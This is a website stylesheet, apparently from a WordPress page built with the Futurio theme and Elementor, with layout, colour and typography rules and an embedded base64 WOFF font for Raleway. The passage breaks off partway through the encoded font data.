            @media (min-width: 768px) {
                .container {
                    width:750px
                }
            }

            @media (min-width: 992px) {
                .container {
                    width:970px
                }
            }

            @media (min-width: 1200px) {
                .container {
                    width:1170px
                }
            }

            .container-fluid {
                margin-right: auto;
                margin-left: auto;
                padding-left: 15px;
                padding-right: 15px
            }

            .row {
                margin-left: -15px;
                margin-right: -15px
            }

            .col-md-12,.col-md-3 {
                position: relative;
                min-height: 1px;
                padding-left: 15px;
                padding-right: 15px
            }

            @media (min-width: 992px) {
                .col-md-12,.col-md-3 {
                    float:left
                }

                .col-md-12 {
                    width: 100%
                }

                .col-md-3 {
                    width: 25%
                }
            }

            label {
                max-width: 100%;
                margin-bottom: 5px
            }

            .clearfix:after,.clearfix:before,.container-fluid:after,.container-fluid:before,.container:after,.container:before,.row:after,.row:before {
                content: " ";
                display: table
            }

            .clearfix:after,.container-fluid:after,.container:after,.row:after {
                clear: both
            }

            @-ms-viewport {
                width: device-width
            }

            .size-full,img {
                max-width: 100%;
                height: auto
            }

            .screen-reader-text:focus {
                font-size: 14px
            }

            a,a:active,a:focus,a:hover {
                text-decoration: none
            }

            a:active {
                border-bottom: none
            }

            .page-wrap {
                overflow: hidden
            }

            .main-container {
                background-color: #fff
            }

            @media (min-width: 1300px) {
                .container {
                    width:1270px
                }
            }

            @media (max-width: 767px) {
                .page-area {
                    left:0;
                    transform: translate3d(0,0,0);
                    -webkit-transform: translate3d(0,0,0);
                    transition: transform .5s ease;
                    -webkit-transition: transform .5s ease
                }
            }

            .single-entry-summary {
                margin-top: 15px;
                width: 100%;
                clear: both
            }

            input[type=text] {
                background-image: -webkit-linear-gradient(rgba(255,255,255,0),rgba(255,255,255,0));
                -webkit-border-radius: 3px
            }

            .page-area {
                padding-top: 15px;
                padding-bottom: 20px
            }

            .widget {
                word-wrap: break-word;
                -webkit-hyphens: auto;
                -moz-hyphens: auto;
                hyphens: auto;
                margin-bottom: 20px;
                position: relative
            }

            .widget ul {
                padding-left: 0;
                list-style-type: none
            }

            .widget ul li {
                margin: 4px 0 0;
                padding: 0 0 4px;
                border-bottom: 1px solid rgba(0,0,0,.08)
            }

            .widget ul li:last-child {
                border-bottom: none
            }

            #content-footer-section {
                background-color: #1e1e1e;
                color: #fff;
                padding: 15px;
                clear: both
            }

            .footer-credits {
                clear: both
            }

            .footer-credits-text {
                padding: 20px 0
            }

            button {
                transition: all .3s ease-in-out;
                -webkit-transition: all .3s ease-in-out
            }

            a {
                color: #fb23ff
            }

            a:active,a:focus,a:hover {
                color: #ff239c
            }

            button,button:hover {
                color: #fb23ff;
                border-color: #fb23ff
            }

            .footer-credits,.footer-credits-text {
                background-color: #fff;
                color: #0a0a0a
            }

            .footer-credits a {
                color: #fb23ff
            }

            .footer-credits a:hover {
                color: #ff239c
            }

            .screen-reader-text {
                top: -10000em
            }

            .elementor *,.elementor :after,.elementor :before {
                box-sizing: border-box
            }

            .elementor a {
                box-shadow: none;
                text-decoration: none
            }

            .elementor img {
                height: auto;
                max-width: 100%;
                border: 0;
                border-radius: 0;
                box-shadow: none
            }

            .elementor-element {
                --flex-direction: initial;
                --flex-wrap: initial;
                --justify-content: initial;
                --align-items: initial;
                --align-content: initial;
                --gap: initial;
                --flex-basis: initial;
                --flex-grow: initial;
                --flex-shrink: initial;
                --order: initial;
                --align-self: initial;
                flex-basis: var(--flex-basis);
                flex-grow: var(--flex-grow);
                flex-shrink: var(--flex-shrink);
                order: var(--order);
                align-self: var(--align-self)
            }

            .elementor-element:where(.e-con-full,.elementor-widget) {
                flex-direction: var(--flex-direction);
                flex-wrap: var(--flex-wrap);
                justify-content: var(--justify-content);
                align-items: var(--align-items);
                align-content: var(--align-content);
                gap: var(--gap)
            }

            .elementor-align-center {
                text-align: center
            }

            :root {
                --page-title-display: block
            }

            .elementor-section {
                position: relative
            }

            .elementor-section .elementor-container {
                display: flex;
                margin-right: auto;
                margin-left: auto;
                position: relative
            }

            @media (max-width: 1024px) {
                .elementor-section .elementor-container {
                    flex-wrap:wrap
                }
            }

            .elementor-widget-wrap {
                position: relative;
                width: 100%;
                flex-wrap: wrap;
                align-content: flex-start
            }

            .elementor:not(.elementor-bc-flex-widget) .elementor-widget-wrap {
                display: flex
            }

            .elementor-widget-wrap>.elementor-element {
                width: 100%
            }

            .elementor-widget {
                position: relative
            }

            .elementor-widget:not(:last-child) {
                margin-bottom: 20px
            }

            .elementor-column {
                position: relative;
                min-height: 1px;
                display: flex
            }

            .elementor-column-gap-default>.elementor-column>.elementor-element-populated {
                padding: 10px
            }

            @media (min-width: 768px) {
                .elementor-column.elementor-col-50 {
                    width:50%
                }

                .elementor-column.elementor-col-100 {
                    width: 100%
                }
            }

            @media (max-width: 767px) {
                .elementor-column {
                    width:100%
                }
            }

            @media (max-width: 767px) {
            }

            .elementor-element .elementor-widget-container {
                transition: background .3s,border .3s,border-radius .3s,box-shadow .3s,transform var(--e-transform-transition-duration,.4s)
            }

            .e-transform .elementor-widget-container {
                transform: perspective(var(--e-transform-perspective,0)) rotate(var(--e-transform-rotateZ,0)) rotateX(var(--e-transform-rotateX,0)) rotateY(var(--e-transform-rotateY,0)) translate(var(--e-transform-translate,0)) translateX(var(--e-transform-translateX,0)) translateY(var(--e-transform-translateY,0)) scaleX(calc(var(--e-transform-flipX,1)*var(--e-transform-scaleX,var(--e-transform-scale,1)))) scaleY(calc(var(--e-transform-flipY,1)*var(--e-transform-scaleY,var(--e-transform-scale,1)))) skewX(var(--e-transform-skewX,0)) skewY(var(--e-transform-skewY,0));
                transform-origin: var(--e-transform-origin-y) var(--e-transform-origin-x)
            }

            .elementor-element {
                --swiper-theme-color: #000;
                --swiper-navigation-size: 44px;
                --swiper-pagination-bullet-size: 6px;
                --swiper-pagination-bullet-horizontal-gap: 6px
            }

            .elementor .elementor-element ul.elementor-icon-list-items {
                padding: 0
            }

            :where(.elementor-widget-n-accordion .e-n-accordion-item>.e-con) {
                border: var(--n-accordion-border-width) var(--n-accordion-border-style) var(--n-accordion-border-color)
            }

            :root {
                --swiper-theme-color: #007aff;
                --swiper-navigation-size: 44px
            }

            .elementor-kit-225 {
                --e-global-color-primary: #6ec1e4;
                --e-global-color-secondary: #54595f;
                --e-global-color-text: #7a7a7a;
                --e-global-color-accent: #61ce70;
                --e-global-typography-primary-font-family: "Roboto";
                --e-global-typography-primary-font-weight: 600;
                --e-global-typography-secondary-font-family: "Roboto Slab";
                --e-global-typography-secondary-font-weight: 400;
                --e-global-typography-text-font-family: "Roboto";
                --e-global-typography-text-font-weight: 400;
                --e-global-typography-accent-font-family: "Roboto";
                --e-global-typography-accent-font-weight: 500;
                --e-global-typography-42265c2-font-size: 94px;
                --e-global-typography-42265c2-font-weight: 700
            }

            .elementor-section.elementor-section-boxed>.elementor-container {
                max-width: 1140px
            }

            .elementor-widget:not(:last-child) {
                margin-block-end:20px}

            .elementor-element {
                --widgets-spacing: 20px 20px
            }

            @media (max-width: 1024px) {
                .elementor-section.elementor-section-boxed>.elementor-container {
                    max-width:1024px
                }
            }

            @media (max-width: 767px) {
                .elementor-section.elementor-section-boxed>.elementor-container {
                    max-width:767px
                }
            }

            .elementor-554 .elementor-element.elementor-element-2833ebc {
                color: #fff
            }

            .elementor-554 .elementor-element.elementor-element-2833ebc>.elementor-widget-container {
                padding: 30px 30px 60px;
                background-color: #f79e1b
            }

            .elementor-554 .elementor-element.elementor-element-12c5a978>.elementor-widget-container {
                --e-transform-translateY: -74px
            }

            .widget {
                line-height: 1.6
            }

            #content-footer-section .widget {
                font-size: 15px;
                letter-spacing: 0;
                text-transform: none
            }

            .futurio-content {
                padding-left: 0;
                padding-right: 0
            }

            @media (min-width: 992px) {
                .widget.col-md-3 {
                    width:25%
                }
            }

            @font-face {
                font-family: "Raleway";
                font-style: normal;
                font-weight: 400;
                src: url(data:application/font-woff;base64,d09GRgABAAAAAFfoAA8AAAAAndgAAQABAAAAAAAAAAAAAAAAAAAAAAAAAABHREVGAAABWAAAAIcAAADiD1ANcUdQT1MAAAHgAAAa7AAAO9i1p1czR1NVQgAAHMwAAAGwAAADUHWvicFPUy8yAAAefAAAAE8AAABgYTAeR1NUQVQAAB7MAAAAPAAAAEjneMwnY21hcAAAHwgAAAHXAAACtJJMVt9nYXNwAAAg4AAAAAgAAAAIAAAAEGdseWYAACDoAAAuBQAAS05dy9nDaGVhZAAATvAAAAA2AAAANhGqHPBoaGVhAABPKAAAACAAAAAkBy8DNWhtdHgAAE9IAAACZQAABFQN9jDTbG9jYQAAUbAAAAIZAAACLDK8RUdtYXhwAABTzAAAABwAAAAgASIAwG5hbWUAAFPoAAABNAAAAn4+FV8FcG9zdAAAVRwAAALKAAAEoOAwgL142mJgZGBi4GOAgANANqBBOWYhKADgIH5/j9cTUkoWSnZlktgkmZTNIDsxSZn45OL61U03IoimQkuho9BV6DOwQ8Z2ojBlZucKC4UlK7tW2ChsFXYKew72yMmeFS5c7Y27fSg8FV4Kbz72q4JfoEg9pa1SURBqQBvoEZLKlr6efo2Uf8o3EswAeNpMysOiFAAYBeDvjGeybdu2bdu2zU1udVdtwpO07plyXf08EvQ0VkPJZtPNt1Jx5eqNO209ce/6RVsvHrt52VbFC6euX7b00rHrF6y+dOHSBRuVEEtVdBUHaUaHRV1N0VRzLbUTBERQUFAUp31V8CWDRYHS7f+/+O3/L28WY40Vk40Ua60Ve43l1y9FREHyViQ1IS9V8jLv/3RTPuSTqPrhV6SUcir/UpX2igq5TR6S5+QleU+aVMlBcpycJZfJTXJfMldMEnUddNJFL731MdAggw0x1HCTTDbFVLPNNd8Cy6202lqbbbHVNnvts98BBx12znkXXXLDLXc99sSklNJIV9I77zMwwzM2kzMz87M0q7Mx27MXcjgncz5XczsP85uKcgC2JAai6KTXyvBp/W0bhbVtb2Ft27Zt27Zt27bN5H5XV86c6dwxBuLKcd3sKlvKVrONbDvbK1KH2Ul2XvRuU2n2UKw/Z2/ZZ/aTKpJC4vopNxmCTiooKIagJ/lTKEVTIhWl0iJXnepSY2pKrakjdae+NJhGitR4mkqzaSEtp7W0mXYqTKnyr5Ykns0SOi/YiW4K3gCP0lGFsWD6g9nsgmPBUpQDGcmjgiIDVqXDgvXl3qgMvAdYG2wq+6wKvAq8Q1IG3gneEWfSW7gg+u3QL4d+TzoivCL6W+moJHwIMkPg3eHd4KHIlILH0yXBCMxGoNMT3lM65YSXAEtithw8AZ4NV3cc9AeD0I+Bx8ADwSB04nBcD5xzmySib8Hby1llLfKn0T8N94W7w/3gfsifkK60gn+Hf4GPxH7OIe+edG5KFsGpcDvYFcl/2OorkoyyCR5Ucgm6wQvLvnM+/hAV1Oqet/X6HoW1gbL4d1Pjmw1POaytrr/qS10xqxqTjYv5cht1tdXaVX2s2pYf5KG28ZrGo3liYf+Cf9XRvKjK9f28NL8c3Fv/qH/krQNm55tZQPHJzivqwUnFq/OncqiefKQaz0d6fVQ9bV95V96f19Wi1ZV8ulafL7Vy5vdVj/PGvKnCTMI5tiswNmPZtrvdtDpbnR12h922PaVCjpqexue0MuPzG3ndk9xRPKWcix3FbTd91nq0LZDo6GifXnivNTGlwgYXLh7Y0628W3m7Yj+YvhxnXfkd850dzcq+2x1nU8p131pv9+Ya18zDBd4XkkuDa9ZZvb+9vCzn3ZTK/9Z5V+7Dld+8a39t7+h30PzO1yeVQuFt5XVG1gy/rgQr/xktCy23lRgM72WG4hP0YLlP05cqMzMzMzMzc5cx7G1MX8eyjieb2YDm2JLG8kTwS3GCIiFCYUpU2aHSaV50tEl8Ux5QFUE15b7KTYmwVqJHpN50lyd0Z09z5IX36J7jhyUK5vJYzHDiBds5z2hixQhDZlWMXDF3JfJmjTTwzh93t9o0ooACRcpGiihku0PEGlVFfBnOsqWcyMmh1UsSyUqJLDT8ZppdirJTlRM9a50slQv06C+KL3zlPB+o4nGE60lOGeTj2FpQlPslsy40yguLtR47uSWVC0V3iKL46FQq9ZZYtREq7WUZH0+q61PCozPLX0l5iE+odfUl3p5WyNMOWJT6wCFuE0h2K8Zfhxg1q9IwL5tVOuXgsxliwkzypVbrkneIOcjNsdkg0ujKqpmlT4azjI/wSaQDipw3UlG14njyNo8SD+lyfPlirEdSKdt7L8xiV3VGlA82CU4rA+QI0z7Gkyzmm+eHC2znCdcFYzs5orsf2EKvSJ2Cm49JnLzmNKvZyVcOccupl1/7O3hcU/0BX+tsI+V9Y+vjzhs81ilejvPIYtrFFrFZkfbKYnrZb6TVRjqvzw+xWqV+8faQuZ9nN5fZzyYesJeDLbG7ULO8n9s6GcrjYrdIiUJtZSzh0U8u9SOrbC6r9C/CTb44RiFZ+qSbokapfcYx5YojSzxT/sHxq0IncSopChdzWKRFrCEQ1B1V23Md/wh/Z675bGATW0R/xQV6eG2ke1zkenbyHcWz8TPtXE4xxDv2cZgCdw2ClOpQXSKXPuOQ9tEHyplVjtNi85BjTh/VVUrxOqDac9Gz6ZjizdS+LaLMqPCPDOjctXX+o8F0yUv+AnPlZX7YadLJsHjlUP2Ek3dzirK8zYLtMsGh6gTj4bT2XWKKvKydlPTg2xqwKakwdzlh+CP8Rt7haYy7VX9Gf4N6drb1zWCs8dnJRf1myEmGvLpvhiGGGczk/NgIOc9pkQ5yKs206A6xxaytjXra3W+f7Htc1pqd5l2G6zDxWuQ7NiLNkNZSe652SnvKw2QpJgynyLc2PXqg/CuF1tYOXko6N2aYK+VzMrOpfJAuesvTBDeSvWlmzWt47kHlt/TUBoQv+XBI+3YvnTrD71KS7uyiks4DRumt/QfldZsRt2XHJ2ETiBjmku1CF2OC0H3sSrzAb5DdsOUphtjHznF9GUZnNwOcs5PKsdsqk32X+PLS/lt2/NCxhOg7Z3YBHNeRhHG8xVKYmZmNK3AYjWEfMzMZj8MMx1R0zGSZSTqzRUFnXQqDUTJJsSC896vx1pYpWFt/vfdmema+6enpGSf+Or38/TXfFkUm1+3vrXopiia2SnLP+Ht/Kv9AZNLfIVEcLL2Ft1v0cofI9SYyf4KSGG6fXq92LEqUb2WxQV1n+urytclXd5QUrLJ8Wxr1YqjBVyP6UWqcWTEuN1eLdXG3vpXkWqLG1zjrPUEclcU+fJfR93A91hsra9eVpZYUbt+6UHrIDqXlWnYWlCzI/TPaqe1yFyvX9yvaZGNchL5fiKz3PnuvIvmkWesWtKINq7FOeUXclHvdTDv58lXjrIl7+PS+CLNek2pfVbtW7Svbaj1TrRaVcaO8cJOebsYtPHWrPHubsrtyLxh1YVT57RkD3FIzfFCN2twjUYd6fa0zcr/RqsJaJI/O8JyJuVjA+1Y2HvG+ElX5kbqMtMVIq+hZT8+WuNeI93n+RBmr3IusNrF6mtWLrB5ntYHVVlb9rJ6JPXirNzJqa2gaTku99wVOnCb9Z7VsV+YmynKAdcjYddWozS2KOtxBa71d22DkRvTn9GmU1/W+Wc3GHWdCjX4LM9mTyjL9NkbGSNWozbVGHUSn1s9HAy83oj/XwTojSmrMYJwZTNDXTWq2edwMKblD/T2e5h97mdnrWvRosTbN7IaImIJ6ZQtyKyjpjiy97WbuvNdCZFktI9PewI+NaFbTgla0YbX1XqcHGV+LIiXFKEEpylCOClQio8dq1Oq1DntR0iFu94+xuDFpf5X2GaJli2h50fgPUfeffDyvdYfLUDNO7Q/V3oApac+sj3kUNKV9+ADrF6JHi170sdmHsr4oRglKUYZyVKASVfw0wPh6j2rU8lAd9rUmlWpeUNOlpltNZ9ThDvOp13LXHbQu1qjjFa2LtChGCUpRhnJUoBJVduIAc07jmlWtOdbhlojYT7YaEDVRzUvP8NJxMdb3++OAmEJTvXNqgZhYIhKWoSmOjayTq522LpHQFyfyaVWE/h/S/xNRjdrcg1GHFFF6baC4Ebuu61Yz6A/7MGXD/nyOWx7FfkXhi5JvepYW8s4H4uCUBeUoGpRYp36jvKR0utLh9lYhR6Us16w05ad86TiIwTg0itQXowSlKEM5KlCJbfOaYaSHoxq1dmMdxtE7HhMxCZPRQE0jVoiSLMoLKurRBKr5K9TIlHbIy+YynPJVah5L2VIeVZoRB3yRdnKWV/toP4zWzVGMEpSiDOWoQCWqtDiKTwfIEBlZpxo1KcYWRx2Gmc+2zPFEYT0W+G5i02+kivy+fYWmKGi/Nemep3Yf9sNF+fUsxsLpp32H2tbUNmvElflZHbr9rFLtZm2fi8+kXNcfCwoeWRiHywA9duCK+JGSH4v1n/BDPd9PlSNm8PZMzKFwrueCXL2WpdHMly1oRRseUbcST8tGq0X2GvtjLQ3rzHZ9rtMoRaK4GCUoRRnKUYFKVMmwR9E3QCunecqMNWKp1rMO49SNp2ii5yRMRoOd34gV1GVRmc7Wa3NvFPz3Fe/j1NyR4rMpnUmHvL1V3uIlFpX5GN8UN1rdrCjssQq9qIp9WGTY19hnYlKW2sK/K2WpTSyn8X5Xsupn1Zy36mW1lVU7qy5WLaxkiPyZ9BCr15LVhAiWopBvrDGrHqdMxghipKB8nO8J1vyHtMkmYcez/h/LvDYWXfFDNTdoNYWuenlhXvLXEn1uTpYyotoau2Y4T9ezXsCqiYqsvdAuyrrU75nfHetYPpeidAJ9t6bTe5MWnfnzc2r0bWe9hvUzeeu+vHUn6/Wst7D+L+v+ZP0G600UyCpm8Rl9jcvvgHoUYtb+Yp18uix5a7hxxplt8hgvyXhm+HrKY318zVppsjbvcVZugqe1yq9Cd173orRexXFgfCt+oK8b414n0f1+R8SP7Yoj42d+R8ef/Y6Jf/kdK0dPlbGnxwx5eHbMjZNjPqWnxWK/s2Op3zmxPFbK6O1+F8az8XxcFKtjfVwaXdEdI6I/Xo5RsdcuM3InfMtZ7VPwbzX4uHC7ejtf76tll5YNWj1ljM2sO+KGNM4GLVYYZ0Py9xIsQ1OKlwUhXgqtG7dvnY+uDq0f1dqYtC2hYRmafGed7n1W9/ht/58XJShFGcpRgUpUOfGOSnl/aQw0z0EYjCEYCnskqlETsd2N7NWke6q1bDBKI5pFbwta0YZ0h1He77nzmXtKjPX+/jjknZ+5dPwmhqe9OtvuuytugFilpYsn7qLn5zzRsV3cflQPq6LHavWiL3enfoqoLkYJSlGGclSgElXyw1FmOMDMh5ml25N1fSBuM9M79HqXiJhqtWbY8zMxFwtESLN924JWtOER5SvxNA849fP5uSvWea737I+gJt3Yve2Fg3ECTsRJOBmn4FSchtNxFi7D5biCkuEY4X0kRmE0xuAq5YX7Az6OT+CT+BQ+jc/gs/gcvsieb9yBilGCUpShHBWoRFXUiRSKMMCcB9otgzAYQzAUmVxbVKMm9hctc6MOw8Jo+Zw+HhPMeaIIn4TJ+La6BnHciBXI4oA41Xk+nLfGsn5/6EGEjLMDbrQ3b94+T9GW9gycwNGuvkevvehLvuTjgpfd19+Dp/vewtN9787T7A/cJR+Mz+/qibwzCZPxTvPDQVHEuhglKEUZylGBSlSl20wufzasf9t8dRjfr2W9NNx/+L2bxmftuUfsuVb+35J8f7vnHXTdmeujc76eptO5arv9d2O0W7Mu0d+t1x7z60WfeR8hG0dcjWtwLa5D8iPejw/gg/gQPowv4CtIXhEd8zwb0LidVx7FCjxWuHvuFWe/o/y3p3nshYNxAk7ESTgZp+BUnIbTcRYGOHMHeg7CYAzBUGTcnav5IeVKGbgOX02nZbs1XpnOlomekzAZd8hud4uFBm0ascIdJouj37N/fljwkTtllO3WT0279ZU9HUXWsRglKEUZylGBSlTl/i47/pFlRAbVSHNFHc611ufhfFyAC3ERLsYluIyPLscV4mC4GBvhfSRGYTTG4Cp111vhsWbwcd+fwCfxKXwan8Fn8Tl8ke2Xxeh4Yx9jxFa9znKPbM/7q0Iv+/EX3+TW5f9F3xs3yiw3aX1zrjP/X1vmxm3a3J6iebMc/zT/peySv39Hykntyrvsgm52hWgOecT8/mDkaUb+d1xnV10vx+TzFq0/NvqmGKduAnXfsee/i+9R8f3cOmoWUTOPmmXUNFIzhZqW/P7qoug1imZRtL2a56hZRc0Mal6lZnX0YpsaN1u++EtcjOG53/HsnyhrpCyfq9yyKOPRP1HWTtkTlK2iZAklWUraKclS8m9KWil5ioo1VCwv+GVWUvOvvJoWap6iZg41z1OzMnpBTZz2Dv6t3h8DKM7wajVqlNU6QeswLJdL2epKcxT51vq1/xNuF+GVW1cAgGW2h5nRPMxsjpnCnBgemJmxzNwuu+86zMycYdyW202ZG+f/FObFP0fv6UpPunAkXXmCHnot99HPAIMMGUvDjNjfqDjGOK4uwaTtp5hmhlnuMS7PO+MCo1+mYCWZZJFNDrnkkc82dhLOUYmHHXV4pJywxwIKKaKYEkopo1xfqaCSKnVZLdZQSx31NDjSRrGJZlpoJUKUGHE66FJ2kimmmWGWp3mZV/S4V3mN13lD3z3JefYHCXp9Ikkkk0IqaaSToV+62zXWr7iflhncAR3S5w5zRM846tpwjONG0AnrCyikiGJKKKWMEWc/qs3GGCd8JrKfB/S4B3mUx4zMJ3iSp31+P1PZ/2mfz2jHs8b5OfG8eMF3/zA+KoIEuSuRJJJJIZU00smYO+VM/uFMHgz26M+H/MJhjmiDo56dj3HcEX1h5pIXKqgkbD+xhlrqqCdsP7GJZlpoJUKUGHE66LLPT2u/e3z/gHz0II/y3izpK75/ldd4nTeM9pOcVsbcjhp59P1Z1Apn81xQQCFFFFNCKWVcpf7L5fMKKuX0KvVcbbmGWuqop0HWa7T+auWvMbKv5Tqu5wZu4mZu4VZlbhNvV+N3cCdN9tFMC61EiBIjTpsy7bbr8BudlruMx26fe2SgXpm2j34GGGRo7mIwzIg++OHr6ITjnGSKaWaY5cNz9td98Z2A55H5+sICVrLOd5liFtnkkEse+WxjJ596NeSLRka5u7gKKh1hlVhNDbXUUU/Yp6z/8HW/yffNtNBKhCgx4nQo36Ncr37SRz8DDGJ2Qg3++Z07ESNpjHE+rS9+RT/9lhznDiV8q/ETyy/pX2VG3ckgkSSSSSGVNNLJMNI2zP08OGSLwxyxh6Mc44QxXEAhRRRTQilllPuFCirl8bBfWq6hljrqaXx35rTJcjMttBIhSow4Hcq5ZoT3ByOMMsY43zBD9E3xAVfJB3mUp13BwuzpOF7lNV7nDc8UJzmtjPmq4IJ4SZ5UE7JQIkkkk0IqaaSToW7nOYKFLLKHxeISlrKM5axgFatZw1rWsZ4N6n2juInNbGEr29nBLnbLsHtk7E9/HjNfIU8ckTHDmT2OyxcNtlODRtpcMKSmhtXUiN8atTzGOBPOfFK5KaaZYZa7zRzd43noMZ623cvOqyFI8G8iSSSTQipppONdgJr41/tPYgstew4KFotLWMoylrOClcqsElezhrWsYz0b2cRmtrCVL3qi267MDnZa3iXudiZ7XEn3OrZ97OcABznkynFYLR2xPpzl4bgzbXAOXWGt/SecCRx2/CPiKGOMM6HMJFNMM8Ms9yj7snjW9uf5h320qLV7gkSSSCaFVNJIJ8PfI83XtgtYyQZ/i5EpZpFNDrnkkc82drL7Izkp+YOc5IpeQCFFFFNCKWWUy5oVVDrjKs/x1ZZrqKWOetRC0Gi9txRhTrpd/7qDO2myvpkWWokQJUacNmU6bNspdvm9XsfaRz8DDDKkHw6Hs4b/+kiOmlCDn1Kz8tSFd+/nf+e+9VdG9i+Cb7of/Zb89R3rvyv7f08m+ZEnzx/7/BPf/0x8+q3/yqfztfUCVpJJFtnkkEse+WxjJ/pNcIICCimimBJKKaPcr1dQabRV2abacg211FFPg7NrtP5a/eCDp7sV79Soo7uDO2lStpkWWokQJUacNmU67Kfz3b7ZbX899KqRPvoZYJBwTl/eGmWMcSYdxxTTzDDLV7RAOMfC3eibH9xZ2s+rvMbrvKHFTnJ+zoyrXP83tft3vA10NUkwahJJIpkUUkkjnXnadL42W8BCy4sc4WJxCUtZxnJWsFKZVeJq1rCWdaxng5G6UdzEZrawlUzbZJFNDrnkkc82tiuzg52Wd4m79ZM9/sJir3y5j/0c4CCH3J0cdtd7RA0ddT95jOPy5AktXEAhRRRTQillXOWaXO6upoJKqmSWarGGWuqop0EtNopXK38N13Id13MDN3Fz4P+riLdym9a7XbyDO2mybTMttBIhSow4bcq002G5U+wyLrrFHnXeSx/9DDDIkHvjYT0sHIfqd4xxJrTbpGOdYpoZZunX2s8GiSSRTAqppJFOxtyPgvlG8gJWsmHua0GmmEU2OeSSRz7b2Mnu8L7hqaCAQooopoRSyihX0xWENSzTVFuuoZY66mmwHzWsZi+/O+YWvn9ndbtsdAd30qRsMy20EiFKjDhtyoS1KHa5H+3WC3rUUq91ffQzwCDec707v/fHj14nbD/p+ymmmXFss3jrFXzV+q+p0a97svyGc/um1vi2sfVdv2M8BverkwdkuQd5lKd8ftr8w6c++em5b9r+pHhKPK38eS17QXznTZP3InLWiNZ7mys70KggCMMwfAfd/0WEAhv5LRhYA4IZthPw61iJRnsA9MggXcPDh/cr9Aq9Qq/QK/QKvUKv0Lunl/SSXtJ7oJf0kl7SS3pJL+klvaSX9D7pVXqVXqVX6VV6lV6lV+kFvaC30nuiF/SCXtALekFv0Fv/9Z27qdfoNXqNXtALekEv6AW9oBf0gl6jt9Jr9DZ67/Ru9Dq9Tq/T6/Q6vUHvm96N3knvpHfS+6A36A16g96gN2ZbOv60pefZlo7Zll7nolK0svPvpbhQ/KL4OBV3ijvFneJOcaN4obhRvFBcKL5QXCi+zS51WN+r9b3+tpefpu1BV64AjKLwuh7bnrlWbdsKatu2Hqo2o9q9z9OdHTVf8MfJXtHMOaedpL+LgzBpgmQZJsUYMxhkluirQFYxlTVacYlWPMVGznCRQ1yWE1zlLie5L5f8xO0yz+Uqr3jDNd7LTT4ywS3aWUwbAYJWIiRthInQSZSM7qx0kqOsuyJlqjR1tximkxFGdY9JJ+Oi7wwlzmSJMIUZhJklSeYwlwTzJOcv+XpYLiFWsJIOVkmANWzQvVFSbJIAmyXEFv+nuI0ddLNTQuySNLvZSzv7OEoHx6Sd4xLihAQ4Ke2ckhinJcQZyXBWS3V5qSxXuU6UG1LgJndJebU6D6XCIx6T93Z5bfeaBm+k4gXrWvALRb5KlW9S47tU+SE1fkqeX9Lkt7T4I03+SosJydPOCq/f4/W7vHuQKDHKxEnTRVYq/63fT1Xi1KRAHZdgiHaGpcsl2l2i6hIJl8i4RMglii6RdImaSiwlwDLpdo+me0Tdo9c9ut1j0D0i7pF1j0736HSPvHvk3COsHkfU46h0q8lxmu4RcY+6e6RdIuUGJTeIuUGDmzLILenktuS4I53clZzbjLjNAI+k5TYttxl1mwG3GXGbPrcZcpthtxlym2G3abnNmNuMu82Y24y7TesfOJU5vnjabJEDrJxBFEbPfWuzthGUQW3biGquaiOozbAvrM2wiBonDWrbDWpuZ2+n3tzM+W7OjxEC+OlOVRydu/YezPqx86anWJ8aPTPDB5KcZ7GpCyw3tf5X7WI7pYbXOGTqFGcIjR2bznHvB8dlsmmeTJg+eqzUTk2eOJpXqcysNG9S2bEpPhUoKN3KoDKuLG9enC5VuQWIjhc2n9l8YvORzQc279m8g/Mvfwk3UMINiaOdVJbG1l3jRaHvMLJLdenYqcPg6jK000DDKb06jKwuiwcXzObBA3tVl12AgDKojCsTSr/SofQp3UqP0qsMAA5ChIlAPm9X4MCJiyAiXRHDlkQN6+MybE3SsGb+hWFjqho2z78zrI3fcLMZTdE5JWzGcMSuwryhDjVRNQ0RvlgTsyu9Qom4pSZiVyJ8QDhjE5zqniHsswkuu3b5vXY1Hvhl3EWcp4jzFnG+Is5fxAWME4T+ynPKY7qq/gwzFJayCrQrZbeuvD/DaUtneurbBzAUr/YjlVX17a3ssDf4lbwgTnGJm3mU0IeF+v/vqwWSUQxVQJf4AnnVIBpqgi8A0xx1CHjaY2BhMmOcwMDKwMDUxRTBwMDgDaEZ4xiMGM0ZkEADA0M6SB7G9/P3c2U4wMCgJMq85r8YAwNLE8MrBQbG6SA5JnamY0BKgYEZAA11C+wAeNoNx7ERQEAUBcB93wVyV4LGRJgR3ow2FKQ4NlsRs0JXWNW9HyM4x3ZlEU03odLyUC8m+d9B+ADSiQVQeNptzDPAWFcABtBz34tt44Z1bDupbTu1MaX7VLdZgi22bdtOfsW2bX1YDxKkKCUVUEqupC86aSe3XCisruZ6uBiSUD+8mExO5iYbk81pSHOl+dMaMYn5Y8FYKlaIVWL1WDs2jC1ip/hjHFytevUS1UtfvAgKi+ppoe9V5YVk0nVFmqb5biolY7lY6arSIDa/UwmlLMNzcDFcjHCh24VmF5qev3ghcH57xpqMFRnLyZhMxp8Zf2QsyPgvo3tG04xG21ZvXbV1qQDa4S05EHqHvgCEngDhr6u/f9YbZ4oJtjnosKnmmW+4HGMsMtF0o02zxy67TXJIUEBBhRVVSmlllFVJZVVUFVX3sEc9po666mmsiaaaaWGOEeY6Y0YopqWOOumim6c941nPedXr3vCmt7zjE9195nNf+sr3fvCjn/xqllNm22eD8bbItFWW046Goo7pYYn9FjseijtprwEGhkIOOGJkKKy/3yw11BDDTJZHIpd8cssrv0JKKqa4Eioqp7wKiqimthpqelAtOzygkfoaaKi5R3yhrVZaa6+Ndjro7CmPe8KTXvGCF72kq7d94F3v+cj7dvrQd772jW/97FO/eMjHoWAo4HzIY6EFVlplxSWlIpKQAAABAAH//wAPeNrdfAVgG0e68MzKtgyyLZYsXq2kFdNKWrEsWWBKHLBjCjpYTJo2VHplOii9wjEztEeP214px4/K8O4dM/Ww14vX/ze7kqM4afszOdKu9hv6eL75ZjZIhuIIUWHqJFIgFTIg5NYytNOTVCU4Oq7rxKoEI8MqrZ6jwrQwrOzT4OfUwh58YNAs3Nvbb7Uq+ql7DTrr8pepsHr5vVR2+aXePugQKeByH/QqR70IYQ4zLC1nsEyGkznMjm8VHl2cwM/cfid1cjn77W9jHd4hfGBlRWolu4fyIIwQkmOEFegfzwGn0JPnhGP0mTb4XS04WkafPVd9tIKeaIN/erUfGXr2nP13oBPoHxG18iOEZO8A6gaRGqijdeI/FXyThEqVDD+AvyscxdPCp/Hdgk9Yftskfu7b1MniSlH4XRHoteAtwieB9/PQ/0HoR4nMyEN439XFQD9xvV6n7ZLr9fKExyMCUims4uCaJADqYGoxJXwOb4mPsalooVF38IzwG9zjyjL